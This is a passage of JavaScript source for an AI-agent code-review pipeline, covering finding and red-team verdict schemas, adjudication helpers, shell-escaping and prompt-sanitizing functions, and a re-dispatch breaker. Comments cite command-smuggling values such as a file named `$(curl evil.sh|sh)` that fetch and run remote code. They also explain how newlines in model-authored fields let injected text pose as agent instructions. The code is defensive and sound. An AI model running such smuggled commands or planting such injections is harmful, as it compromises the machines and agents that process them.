    carriedChecks: { type: 'array', items: { type: 'string' }, description: 'red checks that are REAL but not attributable to this diff (pre-existing dependency advisories on a diff that touches no manifest). Reported, never gate-failing.' },
    seedFindings: { type: 'array', items: FINDING_ITEM },
    notes: { type: 'string' },
  },
}

/** @type {Schema<FindingsAnswer>} */
const FINDINGS_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['lens', 'findings'],
  properties: {
    lens: { type: 'string' },
    findings: { type: 'array', items: FINDING_ITEM },
  },
}

/** @type {Schema<VerdictAnswer>} */
const VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported', 'reason'],
  properties: {
    refuted: { type: 'boolean', description: 'true if the finding does not hold up' },
    citedLineMatches: { type: 'boolean', description: 'true if the cited file:line actually contains what the finding claims' },
    reachable: { type: 'boolean', description: 'true if the path is reachable in production (not test/example-only)' },
    premiseSupported: { type: 'boolean', description: 'true if the load-bearing premise is either self-contained at the cited line or actually shown by the code at whereChecked; false if it is an off-site claim with no evidence that checks out' },
    reason: { type: 'string' },
  },
}

/** @type {Schema<CriticAnswer>} */
const CRITIC_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['missingLenses', 'notes'],
  properties: {
    missingLenses: { type: 'array', items: { type: 'string' }, description: 'lenses from the candidate list that should also run; empty if coverage is complete' },
    notes: { type: 'string', description: 'one line on anything else likely missed, or "coverage complete"' },
  },
}

/** @type {Schema<ChangedAnswer>} */
const CHANGED_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['changed', 'reason'],
  properties: { changed: { type: 'boolean' }, reason: { type: 'string' } },
}
/** @type {Schema<PrCommentsAnswer>} */
const PR_COMMENTS_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['posted', 'reason'],
  properties: {
    posted: { type: 'integer', description: 'how many inline comments were actually created; 0 if none' },
    reason: { type: 'string', description: 'the PR posted to, or why nothing was posted' },
  },
}
/** @type {Schema<AdjudicateAnswer>} */
const ADJUDICATE_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['status', 'currentLine', 'note', 'invariant', 'attack'],
  properties: {
    status: { type: 'string', enum: ['resolved', 'still-open', 'cannot-tell', 'regressed'] },
    currentLine: { type: 'integer', description: 're-located 1-based line; 0 if not found' },
    note: { type: 'string' },
    invariant: { type: 'string', description: 'one-sentence invariant the finding violated' },
    attack: { type: 'string', description: 'the successful attack on the fix; empty string if every attack failed' },
  },
}
// `cannot-tell` exists so that "I could not determine this" has somewhere to go OTHER than
// `resolved`. Without it an adjudicator that cannot find the site (file deleted/renamed, symbol
// gone, the diff unreadable) has only three boxes, and the one that means "no attack succeeded"
// is the one it drifts into — closing a finding nobody verified. It routes to the still-open
// track (the same safe direction a DEAD adjudicator already takes) and annotates `why`, so the
// report shows the item as unverified rather than silently fixed. See adjudicateOne.
// Red-team verdict on a "resolved" Critical/High prior: an independent attempt to defeat the fix.
/** @type {Schema<AttackAnswer>} */
const ATTACK_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['defeated', 'attack'],
  properties: {
    defeated: { type: 'boolean', description: 'true only if a concrete input/state defeats the fix' },
    attack: { type: 'string', description: 'the concrete input/state and why it slips past the fix; empty if none found' },
  },
}

// The craft release that produced a run. Recorded on every run record and index line so an
// aggregate can be filtered to ONE engine version: without it, "did tightening that lens help?"
// is unanswerable, because the numbers blend runs from every rubric the store has ever seen.
// MUST match `.claude-plugin/plugin.json` — `lib/check-workflows.mjs` fails the build if it drifts.
// Pair it with craftCommit (the engine's git HEAD, added by the logger): the version identifies a
// release, the commit separates two runs of the same release while the rubric is being edited.
const CRAFT_VERSION = '0.23.1' // x-release-please-version
// Severity ordering, worst first. Lives in the declarations prefix (not next to its first use in
// dedupPool) so severity-ranking helpers stay unit-testable — the test harness evals this prefix.
/** @type {Record<string, number>} */
const SEV_RANK = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
// One-notch severity demotion (test-only reachability). In the declarations prefix alongside
// SEV_RANK so the severity helpers stay unit-testable.
/** @type {Record<string, string>} */
const DEMOTE = { Critical: 'High', High: 'Medium', Medium: 'Low', Low: 'Info', Info: 'Info' }
// ---- adjudicate-track pure helpers ----
// These live in lib/review-adjudicate.mjs — a real, linted module with real unit tests that IMPORT
// it — and are pasted back in here by the craft-inline gate, because this script cannot be
// imported. Never edit inside the fence: change lib/review-adjudicate.mjs and regenerate with
// `node lib/check-workflows.mjs --fix`.
// >>> craft-inline lib/review-adjudicate.mjs ATTACK_MAX sanitizeAttack baseWhy isHighSeverity classifyRedTeam adjudicateOne adjudicateResolved adjudicateCannotTell adjudicateRegressed shouldRedTeam carriedKey findCarrier ABSORBED_MAX ABSORB_FILE_MAX ABSORB_TITLE_MAX clampField noteAbsorbed absorbedSite absorbInto splitAbsorbed withoutAbsorbed absorbedPromptBlock partitionAbsorbed absorbAcross TRACKED_MARK markTrackedUnverified
const ATTACK_MAX = 500

/**
 * @param {unknown} text
 * @returns {string}
 */
function sanitizeAttack(text) {
  const flat = String(text ?? '').replace(/[\r\n]+/g, ' ').replace(/[#`*_[\]<>|]/g, '')
    .replace(/ — (?=fix incomplete|REGRESSED after fix|UNVERIFIED|still-open|also reported at|\(\+\d+ (?:more|further) report)/gi, ' ')
    .replace(/ \(reopened: /gi, ' (reopened ')
    .replace(/\(\+(?=\d+ (?:more|further) report\(s\))/gi, '(').trim()
  return flat.length > ATTACK_MAX ? `${flat.slice(0, ATTACK_MAX)}…` : flat
}

/**
 * @param {unknown} why
 * @returns {string}
 */
function baseWhy(why) {
  const s = String(why ?? '').replace(/ \(reopened: [^)]*\)\s*$/, '')
    .replace(/ — still-open \(adjudicator did not run[^)]*\)\s*$/, '')
    .replace(/ — REGRESSED after fix \(no detail[^)]*\)\s*$/, '')
    .replace(/ — UNVERIFIED \(adjudicator could not tell[^)]*\)\s*$/, '')
  const re = / — (?:fix incomplete(?: \([^)]*\))?|REGRESSED after fix|UNVERIFIED \(adjudicator could not tell\)): /g
  let last = -1
  /** @type {RegExpExecArray | null} */
  let m
  while ((m = re.exec(s))) last = m.index
  return last === -1 ? s : s.slice(0, last)
}

/**
 * @param {unknown} sev
 * @returns {boolean}
 */
function isHighSeverity(sev) { return ['critical', 'high'].includes(String(sev ?? '').trim().toLowerCase()) }

/**
 * @template {Verdict} V
 * @param {Finding} f
 * @param {V} adj
 * @param {Verdict | null | undefined} rt
 * @returns {{ adj: V, died: boolean, overturned: boolean, invalid: boolean }}
 */
function classifyRedTeam(f, adj, rt) {
  if (!isHighSeverity(f.severity)) return { adj, died: false, overturned: false, invalid: false }
  if (rt == null) return { adj: { ...adj, note: `${adj.note || ''} [red-team did not run — agent died; resolved on the adjudicator's attack pass alone]`.trim() }, died: true, overturned: false, invalid: false }
  const atk = sanitizeAttack(rt.attack)
  if (rt.defeated && !atk) return { adj: { ...adj, note: `${adj.note || ''} [red-team claimed defeat with no attack — invalid verdict discarded; resolved on the adjudicator's attack pass alone]`.trim() }, died: false, overturned: false, invalid: true }
  if (rt.defeated) return { adj: { ...adj, status: 'still-open', attack: `(red-team) ${atk}` }, died: false, overturned: true, invalid: false }
  return { adj, died: false, overturned: false, invalid: false }
}

/**
 * `entry` is `f` re-stamped (line, why, disposition, note), so it is returned as the caller's own type.
 * @template {Finding} F
 * @param {F} f
 * @param {Verdict | null | undefined} r
 * @returns {{ track: 'stillOpen' | 'resolved' | 'regressed', entry: F & { line?: unknown, note?: string, disposition?: string }, adjudicatorDied?: boolean, demoted?: boolean, cannotTell?: boolean }}
 */
function adjudicateOne(f, r) {
  const located = { ...f, line: r?.currentLine || f.line }
  const attack = sanitizeAttack(r?.attack)
  if (r == null) return { track: 'stillOpen', adjudicatorDied: true, entry: { ...located, why: `${baseWhy(f.why)} — still-open (adjudicator did not run — agent died; kept still-open by default)` } }
  const status = r.status || 'still-open'
  if (status === 'resolved') return adjudicateResolved(f, located, r, attack)
  if (status === 'cannot-tell') return adjudicateCannotTell(f, located, r)
  if (status === 'regressed') return adjudicateRegressed(f, located, r)
  return { track: 'stillOpen', entry: attack ? { ...located, why: `${baseWhy(f.why)} — fix incomplete: ${attack}` } : located }
}

/**
 * @template {Finding} F
 * @param {F} f
 * @param {F & { line?: unknown }} located
 * @param {Verdict} r
 * @param {string} attack  the verdict's sanitized attack
 * @returns {{ track: 'stillOpen' | 'resolved', entry: F & { line?: unknown, note?: string, disposition?: string }, demoted?: boolean }}
 */
function adjudicateResolved(f, located, r, attack) {
  if (attack) return { track: 'stillOpen', demoted: true, entry: { ...located, why: `${baseWhy(f.why)} — fix incomplete (adjudicator reported attack despite resolved): ${attack}` } }
  return { track: 'resolved', entry: { ...located, disposition: 'closed', ...(r.note ? { note: sanitizeAttack(r.note) } : {}) } }
}

/**
 * @template {Finding} F
 * @param {F} f
 * @param {F & { line?: unknown }} located
 * @param {Verdict} r
 * @returns {{ track: 'stillOpen', entry: F & { line?: unknown }, cannotTell: boolean }}
 */
function adjudicateCannotTell(f, located, r) {
  const note = sanitizeAttack(r.note) || sanitizeAttack(r.attack)
  return { track: 'stillOpen', cannotTell: true, entry: { ...located, why: `${baseWhy(f.why)} — UNVERIFIED (adjudicator could not tell): ${note || 'no reason returned'}` } }
}

/**
 * @template {Finding} F
 * @param {F} f
 * @param {F & { line?: unknown }} located
 * @param {Verdict} r
 * @returns {{ track: 'regressed', entry: F & { line?: unknown } }}
 */
function adjudicateRegressed(f, located, r) {
  const note = sanitizeAttack(r.note)
  return { track: 'regressed', entry: { ...located, why: note ? `${baseWhy(f.why)} — REGRESSED after fix: ${note}` : `${baseWhy(f.why)} — REGRESSED after fix (no detail returned by adjudicator)` } }
}

/**
 * @param {Verdict | null | undefined} r
 * @returns {boolean}
 */
function shouldRedTeam(r) {
  return r?.status === 'resolved' && !sanitizeAttack(r.attack)
}

/**
 * @param {Finding | null | undefined} f
 * @returns {string}
 */
function carriedKey(f) {
  const file = String(f?.file ?? '').trim().toLowerCase()
  const ruleId = String(f?.ruleId ?? '').trim().toLowerCase()
  return file && ruleId ? `${file}\u0000${ruleId}` : ''
}

/**
 * @template {Finding} F
 * @template {Finding} P
 * @param {F} f
 * @param {P[] | null | undefined} priors
 * @param {FallbackMatch<F, P>} [fallbackMatch]
 * @returns {P | null}
 */
function findCarrier(f, priors, fallbackMatch) {
  const key = carriedKey(f)
  return (priors || []).find(p => {
    const pk = carriedKey(p)
    if (key && pk) return key === pk
    return typeof fallbackMatch === 'function' ? !!fallbackMatch(f, p) : false
  }) || null
}

const ABSORBED_MAX = 3

const ABSORB_FILE_MAX = 120

const ABSORB_TITLE_MAX = 160

/**
 * @param {unknown} text
 * @param {number} max
 * @returns {string}
 */
function clampField(text, max) {
  const s = sanitizeAttack(text)
  return s.length > max ? `${s.slice(0, max)}…` : s
}

/**
 * @param {unknown} baseText
 * @param {Finding | null | undefined} f
 * @returns {string}
 */
function noteAbsorbed(baseText, f) {
  const base = String(baseText ?? '')
  const mark = ' — also reported at '
  const clause = `${mark}${absorbedSite(f)}`
  if (base.includes(clause)) return base
  if (base.split(mark).length - 1 < ABSORBED_MAX) return base + clause
  const overflow = / — \(\+(\d+) more report\(s\) at this site\)/
  const m = base.match(overflow)
  return `${m ? base.replace(overflow, '') : base} — (+${m ? Number(m[1]) + 1 : 1} more report(s) at this site)`
}

/** @param {Finding | null | undefined} f @returns {string} */
function absorbedSite(f) {
  return `${clampField(f?.file, ABSORB_FILE_MAX) || '?'}:${Number(f?.line) || 0}: ${clampField(f?.title, ABSORB_TITLE_MAX) || 'untitled'}`
}

/**
 * @param {unknown} hostWhy
 * @param {Finding | null | undefined} f
 * @returns {string}
 */
function absorbInto(hostWhy, f) {
  const s = String(hostWhy ?? '')
  const base = baseWhy(s)
  return noteAbsorbed(base, f) + s.slice(base.length)
}

/**
 * @param {unknown} why
 * @returns {{ base: string, sites: string[], more: number }}
 */
function splitAbsorbed(why) {
  const overflow = / — \(\+(\d+) more report\(s\) at this site\)/
  let head = baseWhy(why)
  const m = head.match(overflow)
  const more = m ? Number(m[1]) : 0
  if (m) head = head.replace(overflow, '')
  const parts = head.split(' — also reported at ')
  return { base: /** @type {string} */ (parts[0]), sites: parts.slice(1).map(s => s.trim()).filter(Boolean), more }
}

/**
 * @param {unknown} why
 * @returns {string}
 */
function withoutAbsorbed(why) {
  const s = String(why ?? '')
  return splitAbsorbed(s).base + s.slice(baseWhy(s).length)
}

/**
 * @param {unknown} why
 * @returns {string}
 */
function absorbedPromptBlock(why) {
  const { sites, more } = splitAbsorbed(why)
  if (!sites.length && !more) return ''
  const lines = sites.map(s => `  - ${s}`)
  if (more) lines.push(`  - (+${more} further report(s) at this site, not named individually)`)
  return `\nALSO REPORTED AT THIS SITE (further defects later rounds raised at the same file+rule; they are tracked ONLY through this finding and leave the ledger when it does):\n${lines.join('\n')}\nThey are part of what you are adjudicating: "resolved" requires that every one of them is gone too. If any of them still stands, return "still-open" and cite it in \`attack\`.\n`
}

/**
 * @template {Finding} F
 * @template {Finding} P
 * @param {F[] | null | undefined} findings
 * @param {P[] | null | undefined} livePriors
 * @param {RetiredSet<P>} retired
 * @param {FallbackMatch<F, P>} [fallbackMatch]
 * @param {Iterable<[P, string]> | null | undefined} [seed]
 * @returns {Partition<F, P>}
 */
function partitionAbsorbed(findings, livePriors, retired, fallbackMatch, seed) {
  /** @param {P} h */
  const isRetired = h => (retired instanceof Set ? retired.has(h) : !!(retired || []).includes(h))
  /** @type {F[]} */
  const kept = []
  /** @type {Map<P, string>} */
  const updates = new Map(seed || [])
  let absorbed = 0, keptAtRetired = 0
  for (const f of findings || []) {
    const host = findCarrier(f, livePriors, fallbackMatch)
    if (!host) { kept.push(f); continue }
    if (isRetired(host)) { keptAtRetired++; kept.push(f); continue }
    absorbed++
    updates.set(host, absorbInto(updates.has(host) ? updates.get(host) : host.why, f))
  }
  return { kept, absorbed, keptAtRetired, updates }
}

/**
 * @template {Finding} F
 * @template {Finding} P
 * @param {(F[] | null | undefined)[] | null | undefined} lists
 * @param {P[] | null | undefined} livePriors
 * @param {RetiredSet<P>} retired
 * @param {FallbackMatch<F, P>} [fallbackMatch]
 * @returns {{ runs: Partition<F, P>[], updates: Map<P, string>, absorbed: number, keptAtRetired: number }}
 */
function absorbAcross(lists, livePriors, retired, fallbackMatch) {
  /** @type {Partition<F, P>[]} */
  const runs = []
  /** @type {Map<P, string>} */
  let updates = new Map()
  for (const list of lists || []) {
    const r = partitionAbsorbed(list, livePriors, retired, fallbackMatch, updates)
    updates = r.updates
    runs.push(r)
  }
  return {
    runs,
    updates,
    absorbed: runs.reduce((n, r) => n + r.absorbed, 0),
    keptAtRetired: runs.reduce((n, r) => n + r.keptAtRetired, 0),
  }
}

const TRACKED_MARK = ' — (this site is already tracked by a still-live prior finding; NOT absorbed into it: nothing checked this report against the code, so it may not hold that prior open)'

/**
 * @template {Finding} F
 * @template {Finding} P
 * @param {F[] | null | undefined} findings
 * @param {P[] | null | undefined} livePriors
 * @param {RetiredSet<P>} retired
 * @param {FallbackMatch<F, P>} [fallbackMatch]
 * @returns {{ kept: Array<F & { ledgerDupOfUnverifiedPrior?: boolean }>, marked: number, collapsed: number, updates: Map<P, string> }}
 */
function markTrackedUnverified(findings, livePriors, retired, fallbackMatch) {
  /** @param {P} h */
  const isRetired = h => (retired instanceof Set ? retired.has(h) : !!(retired || []).includes(h))
  const hosts = (livePriors || []).filter(h => !isRetired(h))
  const unverifiedHosts = hosts.filter(h => String(h?.tier ?? '') === 'unverified')
  let marked = 0
  let collapsed = 0
  /** @type {Map<P, string>} */
  const updates = new Map()
  const kept = (findings || []).map(f => {
    const host = findCarrier(f, unverifiedHosts, fallbackMatch) || findCarrier(f, hosts, fallbackMatch)
    if (!host) return f
    const dup = String(host.tier ?? '') === 'unverified' ? { ledgerDupOfUnverifiedPrior: true } : {}
    if (dup.ledgerDupOfUnverifiedPrior) {
      collapsed++
      updates.set(host, absorbInto(updates.has(host) ? updates.get(host) : host.why, f))
    }
    const why = String(f.why ?? '')
    if (why.includes(TRACKED_MARK)) return { ...f, ...dup }
    marked++
    return { ...f, ...dup, why: why + TRACKED_MARK }
  })
  return { kept, marked, collapsed, updates }
}
// <<< craft-inline
// Model-authored finding fields reach agent PROMPTS as context. The injection vector in a
// single-value prompt field is the NEWLINE (it lets injected text pose as a fresh instruction line);
// markdown structure chars are inert there. So flatten newlines (the vector) while PRESERVING
// identifier characters `_ < > [ ]`: symbols (`handle_request`, `Vec<T>`) and paths
// (`src/review_adjudicate.rs`) carry them and they are LOAD-BEARING — the adjudicate/red-team prompts
// tell the agent to grep the symbol/file to RELOCATE the finding, so mangling them (as sanitizeAttack's
// strip set did) breaks the grep. flattenField neutralizes newlines and caps length while leaving those
// chars intact. Ledger storage stays raw (matchesPrior fingerprints on the unsanitized ruleId+title) —
// only the prompt copy is flattened. The `git diff` shell argument is a SHELL value, not a prompt
// value, so it is NOT routed through flattenField — it is single-quoted with shq(). JSON.stringify does
// NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
// context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
// would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
/** @param {unknown} v */
function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }
/** @param {Finding} f */
function promptFields(f) {
  return {
    title: flattenField(f['title']),
    symbol: flattenField(f['symbol']) || '?',
    ruleId: flattenField(f['ruleId']) || '—',
    file: flattenField(f['file']),
    severity: flattenField(f['severity']),
    // A locator field like file/symbol: paths and identifiers are load-bearing (the verifier is
    // told to OPEN it), so flatten newlines but keep `_ < > [ ]` intact — see flattenField.
    whereChecked: flattenField(f['whereChecked']),
  }
}
// POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
// sub-agent will RUN (the carry/adjudicate `git diff -- <path>`). Single quotes disable ALL shell
// expansion, so `$(...)`, backtick, `$VAR`, spaces and `;`/`|`/`&` inside are literal. The `'\''`
// sequence (close-quote, escaped-quote, reopen-quote) safely embeds a literal single quote. Note:
// JSON.stringify does NOT make a value shell-safe — it only escapes `"`/`\`/control chars, and inside
// a double-quoted shell context `$(...)`, backtick and `$VAR` still expand; single-quoting is what
// neutralizes them.
// UNGATED TWIN: this `shq` lives OUTSIDE the craft-inline fence and is excluded from that region's
// name list to avoid a duplicate declaration — so `check-workflows` byte-compares the escaper against
// lib/run-logging.mjs in the other three engines and is blind to it here. A hardening that lands on
// the source therefore regenerates into three engines and silently skips the fourth, which is the
// only one passing model-authored `repo`/`runDir` through it. Change one, change this by hand.
/** @param {unknown} s */
function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
// A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
// interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
// shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
// fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
// default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
/** @param {unknown} s */
function isCommitish(s) {
  const v = String(s ?? '').trim()
  if (!v) return false
  if (/^[0-9a-fA-F]{7,40}$/.test(v)) return true
  return /^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$/.test(v)
}

// >>> craft-inline lib/review-coverage.mjs CANON_SEVERITY canonicalSeverity PRIOR_SUMMARY_MAX_CHARS PRIOR_SUMMARY_TITLE_MAX priorFoundSummary
/** @type {Record<string, string>} */
const CANON_SEVERITY = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info' }

/** @param {unknown} sev */
function canonicalSeverity(sev) { return CANON_SEVERITY[String(sev ?? '').trim().toLowerCase()] || String(sev ?? '').trim() }

const PRIOR_SUMMARY_MAX_CHARS = 3000

const PRIOR_SUMMARY_TITLE_MAX = 120

/**
 * @typedef {{file?: unknown, line?: unknown, title?: unknown, severity?: unknown} | null | undefined} PriorFinding
 * @param {unknown} pool
 * @param {{maxChars?: number, titleMax?: number}} [opts]
 */
function priorFoundSummary(pool, { maxChars = PRIOR_SUMMARY_MAX_CHARS, titleMax = PRIOR_SUMMARY_TITLE_MAX } = {}) {
  const items = /** @type {PriorFinding[]} */ (Array.isArray(pool) ? pool : [])
  if (!items.length) return 'none yet'
  /** @type {Record<string, number>} */
  const rank = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
  /** @param {PriorFinding} f */
  const line = f => `${String(f?.file ?? '').replace(/[\r\n]+/g, ' ').trim() || '?'}:${f?.line || 0} ${String(f?.title ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, titleMax)}`.trimEnd()
  const ordered = items
    .map((f, i) => ({ f, i }))
    .sort((a, b) => ((rank[canonicalSeverity(a.f?.severity)] ?? 9) - (rank[canonicalSeverity(b.f?.severity)] ?? 9)) || (a.i - b.i))
    .map(({ f }) => line(f))
  const kept = []
  let used = 0
  for (const l of ordered) {
    if (kept.length && used + l.length + 1 > maxChars) break
    kept.push(l)
    used += l.length + 1
  }
  const omitted = ordered.length - kept.length
  if (omitted > 0) {
    kept.push(`… and ${omitted} more already-found finding(s), lowest severity first, withheld to keep this prompt small. This list is PARTIAL: anything you re-surface is de-duplicated downstream, so do not spend effort guessing what is missing from it.`)
  }
  return kept.join('\n')
}
// <<< craft-inline



// The invariant string interpolated into the red-team prompt is model-authored (from the
// adjudicator's own verdict, falling back to the finding `why`). Route it through sanitizeAttack
// so runaway/injected structure cannot restyle or hijack the next agent's prompt.
/** @param {{ invariant?: unknown }} adj @param {Finding} f */
function redTeamInvariant(adj, f) {
  return sanitizeAttack(adj.invariant) || sanitizeAttack(f['why'])
}


// ---- resilient agent call ----
// agent() returns null when the subagent dies on a terminal API error (after the harness's own
// retries) or is skipped. A single quiet re-dispatch recovers most API deaths. Budget-exceeded
// THROWS and is deliberately not caught — retrying it would just throw again.
const AGENT_TRIES = 2
// Every prompt in this workflow goes through ragent, so this is the one place that can retarget the
// whole review at another checkout. Prepended (not appended) because it has to win over the git
// commands the individual prompts spell out; shq() because the path is an argument to a real `cd`.
const REPO_DIRECTIVE = repoDirective()
function repoDirective() {
  return repoArg
    ? `WORKING DIRECTORY: this review targets the repository at ${shq(repoArg)} — NOT the directory you start in. Before ANY git / cargo / nix / file command, \`cd\` there (or pass \`git -C\`). Every file path in this review is relative to that root. If that directory does not exist or is not a git repository, say so and stop rather than reviewing whatever repo you happen to be sitting in.\n\n`
    : ''
}
// ---- per-agent wall-clock deadline ----
// The retry above only fires when agent() RESOLVES to null. An agent whose request hangs mid-response
// never resolves and never throws, so nothing above catches it. A measured run lost 64 minutes — a
// third of its wall clock — to six agents frozen inside one `parallel()` barrier, and then died
// without writing anything. The fix is to stop WAITING, not to wait more cleverly.
//
// Honest limit: the sandbox exposes setTimeout/clearTimeout but no AbortController, so losing the
// race abandons the wait without cancelling the agent — a hung one keeps its concurrency slot until
// the harness reaps it. That is still the difference between a phase that proceeds shorthanded and a
// review that stops dead, which is what actually happened.
//
// The clock starts at DISPATCH, so a deadline covers queue wait PLUS execution — not execution
// alone. Calibrating against execution time was a real and expensive mistake: Verify sat at 15min
// against an 811s measured maximum, then a ~130-thunk wave queued agents for a quarter of an hour
// before they ran, the deadline fired on agents that were merely waiting, and 23 findings cost 172
// verification agents. Dispatch is windowed now (VERIFY_WINDOW_AGENTS), which caps the queue term — and
// these numbers are set against the SUM: ~24 agents dispatched in flight over an execution p90 of
// ~360s is well under 15min of waiting, so 30min leaves real headroom above both parts. The window
// bounds DISPATCH, not occupancy: the re-dispatch below leaves the abandoned agent holding its
// harness slot, so occupancy can transiently reach ~48 — but only after a 30min deadline, so it
// cannot rebuild the storm. Lenses get 90min for a blunter reason: a single lens legitimately ran
// 46 minutes, so no threshold there can separate "hung" from "thorough" — it is a backstop against
// an agent stuck for hours, nothing finer.

// ---- re-dispatch breaker (verification only) ----
// >>> craft-inline lib/agent-retry.mjs DEATH_WINDOW_DISPATCHES DEATHS_IN_WINDOW_TO_OPEN positiveInt makeDeathBreaker
const DEATH_WINDOW_DISPATCHES = 6

const DEATHS_IN_WINDOW_TO_OPEN = 3

/**
 * @param {unknown} value
 * @param {number} fallback
 * @returns {number}
 */
function positiveInt(value, fallback) {
  const n = Math.floor(Number(value))
  return Number.isFinite(n) && n >= 1 ? n : fallback
}

/** @param {{ window?: number, toOpen?: number }} [opts] */
function makeDeathBreaker(opts = {}) {
  const windowLen = positiveInt(opts.window, DEATH_WINDOW_DISPATCHES)
  const toOpen = Math.min(windowLen, positiveInt(opts.toOpen, Math.min(windowLen, DEATHS_IN_WINDOW_TO_OPEN)))
  /** @type {boolean[]} */
  const recent = []
  /** @param {boolean} isDeath */
  const observe = isDeath => {
    recent.push(isDeath)
    while (recent.length > windowLen) recent.shift()
  }
  const deaths = () => recent.reduce((n, isDeath) => n + (isDeath ? 1 : 0), 0)
  return {
    deathAllowsRedispatch() {
      observe(true)
      return deaths() < toOpen
    },
    recordLive() {
      observe(false)
    },
    deaths,
    observed() {
      return recent.length
    },
    windowLen,
    toOpen,
  }
}
// <<< craft-inline
// ARMED BY THE CALLER, NOT BY A PHASE LABEL, and that distinction is the whole scope of this thing.
// What makes a dead dispatch worth suppressing is that it is dispatched THROUGH THE BOUNDED
// VERIFICATION WINDOW (VERIFY_WINDOW_AGENTS): there a slot held by a dead agent is a slot DENIED to
// a live one. `opts.phase` cannot say that — it is the key into PHASE_DEADLINE_MS, a deadline
// bucket, and three dispatches wear `phase: 'Verify'` while running nowhere near the window: the
// single haiku dedup agent (before the pool), the `<profile>-verify` checkpoint (after it), and
// anything later that reuses the bucket. Keying on the label leaked both ways — a dead one of those
// ate a window slot's worth of evidence, and a live one wrote reachability the pool never observed.
// So `verifyPool` creates a breaker and hands it to exactly the dispatches it windows; every other
// dispatch, in any phase, passes none and is neither counted nor allowed to reset anything. A lens
// is deliberately not given one: there a suppressed re-dispatch costs a whole dimension of the
// review, and the window is not the scarce thing.

// ---- slicing the diff a lens reviews ----
// Pure helper, tested as a real module in lib/lens-scope.mjs and pasted back here by the
// craft-inline gate. The measurement that motivates it — lenses at 73.6% of a run, the whole diff
// pulled by every lens on every round — lives there, with the risk it does not solve.
// >>> craft-inline lib/lens-scope.mjs utf8Bytes utf8Text utf8Feed utf8Start utf8Lead utf8FirstRange decodeGitPath gitPathChunk MAX_SHARED_PER_SLICE SHARED_SUFFIXES GROUP_DEPTH isShared groupKey splitDeep commonPrefixLength mergedKey uniqueKey sliceDiff partitionOwned groupFilesByKey largestGroupFirst mergeNearestGroups pickMerge mergeCandidate closerMerge sliceableLens WHOLE_DIFF_LENSES LENS_WINDOW_AGENTS pathspecLiteral
/** @param {string} text @returns {number[]} */
function utf8Bytes(text) {
  /** @type {number[]} */
  const out = []
  for (const ch of text) {
    let cp = /** @type {number} */ (ch.codePointAt(0))
    if (cp >= 0xd800 && cp <= 0xdfff) cp = 0xfffd
    if (cp < 0x80) out.push(cp)
    else if (cp < 0x800) out.push(0xc0 | (cp >> 6), 0x80 | (cp & 0x3f))
    else if (cp < 0x10000) out.push(0xe0 | (cp >> 12), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f))
    else out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f))
  }
  return out
}

/** @param {number[]} bytes @returns {string} */
function utf8Text(bytes) {
  /** @type {Utf8State} */
  const st = { out: '', cp: 0, need: 0, seen: 0, lower: 0x80, upper: 0xbf }
  let i = 0
  while (i < bytes.length) i += utf8Feed(st, /** @type {number} */ (bytes[i]))
  if (st.need !== 0) st.out += '�'
  return st.out
}

/**
 * @typedef {{ out: string, cp: number, need: number, seen: number, lower: number, upper: number }} Utf8State
 */
/** @param {Utf8State} st @param {number} b @returns {number} */
function utf8Feed(st, b) {
  if (st.need === 0) { utf8Start(st, b); return 1 }
  if (b < st.lower || b > st.upper) {
    st.cp = st.need = st.seen = 0; st.lower = 0x80; st.upper = 0xbf
    st.out += '�'
    return 0
  }
  st.lower = 0x80; st.upper = 0xbf
  st.cp = (st.cp << 6) | (b & 0x3f)
  st.seen++
  if (st.seen === st.need) { st.out += String.fromCodePoint(st.cp); st.cp = st.need = st.seen = 0 }
  return 1
}

/** @param {Utf8State} st @param {number} b */
function utf8Start(st, b) {
  if (b <= 0x7f) { st.out += String.fromCharCode(b); return }
  const lead = utf8Lead(b)
  if (lead) Object.assign(st, lead)
  else st.out += '�'
}

/** @param {number} b @returns {{ need: number, cp: number, lower: number, upper: number } | null} */
function utf8Lead(b) {
  const range = utf8FirstRange(b)
  if (b >= 0xc2 && b <= 0xdf) return { need: 1, cp: b & 0x1f, ...range }
  if (b >= 0xe0 && b <= 0xef) return { need: 2, cp: b & 0x0f, ...range }
  if (b >= 0xf0 && b <= 0xf4) return { need: 3, cp: b & 0x07, ...range }
  return null
}

/** @param {number} b @returns {{ lower: number, upper: number }} */
function utf8FirstRange(b) {
  return { lower: b === 0xe0 ? 0xa0 : b === 0xf0 ? 0x90 : 0x80, upper: b === 0xed ? 0x9f : b === 0xf4 ? 0x8f : 0xbf }
}

/** @param {unknown} file */
function decodeGitPath(file) {
  const raw = String(file ?? '')
  if (!(raw.length > 1 && raw.startsWith('"') && raw.endsWith('"'))) return raw
  const body = [...raw.slice(1, -1)]
  /** @type {number[]} */
  const bytes = []
  for (let i = 0; i < body.length; i++) {
    const { out, skip } = gitPathChunk(body, i)
    bytes.push(...out)
    i += skip
  }
  return utf8Text(bytes) || raw
}

